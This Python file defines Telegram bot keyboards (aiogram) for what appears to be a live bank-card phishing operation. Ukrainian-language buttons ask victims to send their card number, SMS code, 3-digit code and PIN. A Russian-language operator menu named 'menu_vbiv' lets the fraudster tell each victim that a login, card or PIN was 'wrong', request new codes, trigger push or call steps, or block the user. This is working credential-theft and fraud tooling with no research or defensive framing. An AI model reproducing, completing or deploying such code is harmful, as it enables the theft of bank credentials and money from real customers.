from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from database import db
kb_admin = InlineKeyboardMarkup(row_width=2)
kb_admin.add(InlineKeyboardButton(text='Добавить кнопку', callback_data='add_butt'),
             InlineKeyboardButton(text='Удалить кнопку', callback_data='del_butt'))
#kb_admin.add(InlineKeyboardButton(text='Изменить пасты', callback_data='up_past'))
kb_admin.add(InlineKeyboardButton(text='Настройки гл. кнопок', callback_data='set_butt_photo'))
#kb_admin.add(InlineKeyboardButton(text='Добавить вопрос', callback_data='add_q'),
             #InlineKeyboardButton(text='Удалить вопрос', callback_data='del_q'))

kb_confirm = InlineKeyboardMarkup(row_width=2)
kb_confirm.add(InlineKeyboardButton(text='Да', callback_data='yes'),
               InlineKeyboardButton(text='Нет', callback_data='no'))

kb_nazad = ReplyKeyboardMarkup(resize_keyboard=True)
kb_nazad.add(KeyboardButton(text='Назад'))


def number(user_id, vbiv_id):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text=f'Надішліть правильний номер', callback_data=f'z|n|{user_id}|{vbiv_id}'))
    return kb


def card(user_id, vbiv_id):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text=f'Надіслати номер картки', callback_data=f'z|card|{user_id}|{vbiv_id}'))
    return kb


def code(user_id, vbiv_id):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text=f'Надіслати код', callback_data=f'z|code|{user_id}|{vbiv_id}'))
    return kb


def code3(user_id, vbiv_id):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text=f'Надіслати код', callback_data=f'z|cod3|{user_id}|{vbiv_id}'))
    return kb


def pin(user_id, vbiv_id):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text=f'Надіслати PIN', callback_data=f'z|pin|{user_id}|{vbiv_id}'))
    return kb


def msg(user_id, vbiv_id):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text=f'Відповісти', callback_data=f'z|msg_u|{user_id}|{vbiv_id}'))
    return kb


def menu_vbiv(user_id):
    kb = InlineKeyboardMarkup(row_width=4)
    kb.add(InlineKeyboardButton(text='Неверный номер', callback_data=f'#|num|{user_id}'),
           InlineKeyboardButton(text='Неверный логин или пароль', callback_data=f'#|lp|{user_id}'))
    kb.add(InlineKeyboardButton(text='Неверный пароль', callback_data=f'#|p|{user_id}'),
           InlineKeyboardButton(text='Отменил авторизацию', callback_data=f'#|otm_auth|{user_id}'))
    kb.add(InlineKeyboardButton(text='Неверная карта', callback_data=f'#|crd|{user_id}'),
           InlineKeyboardButton(text='Отправить сообщение', callback_data=f'#|msg|{user_id}'),
           InlineKeyboardButton(text='Запросить код', callback_data=f'#|gc|{user_id}'))
    kb.add(InlineKeyboardButton(text='Неверный PIN', callback_data=f'#|pin|{user_id}'),
           InlineKeyboardButton(text='Пуш', callback_data=f'#|push|{user_id}'),
           InlineKeyboardButton(text='Звонок', callback_data=f'#|zvon|{user_id}'))
    kb.add(InlineKeyboardButton(text='Код 3 цифры', callback_data=f'#|cod3|{user_id}'))
    kb.add(InlineKeyboardButton(text='Заблокировать', callback_data=f'#|bl|{user_id}'))
    return kb


def main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, selective=True)
    base = db.get_butt()
    x1 = 0
    x2 = 1
    try:
        for i in range(len(base)):
            markup.add(
                base[x1][1],
                base[x2][1],
            )
            x1 += 2
            x2 += 2
    except Exception as e:
        try:
            markup.add(
                base[x1][1],
            )
        except:
            return markup
    return markup


def main_quest():
    markup = InlineKeyboardMarkup(row_width=1, selective=True)
    base = db.get_quest()
    for i in base:
        markup.add(InlineKeyboardButton(text=i[1], callback_data=i[2]))
    return markup


#def main_quest():
    #markup = InlineKeyboardMarkup(row_width=1, selective=True)
    #base = db.get_quest()
    #for i, button in enumerate(base):
        #markup.add(InlineKeyboardButton(text=button[1], callback_data=f'{i}'))
    #return markup


kb_authorize = InlineKeyboardMarkup(row_width=1)
kb_authorize.add(InlineKeyboardButton(text='Авторизоваться', callback_data='ayes'),
                 InlineKeyboardButton(text='Отменить', callback_data='ano'))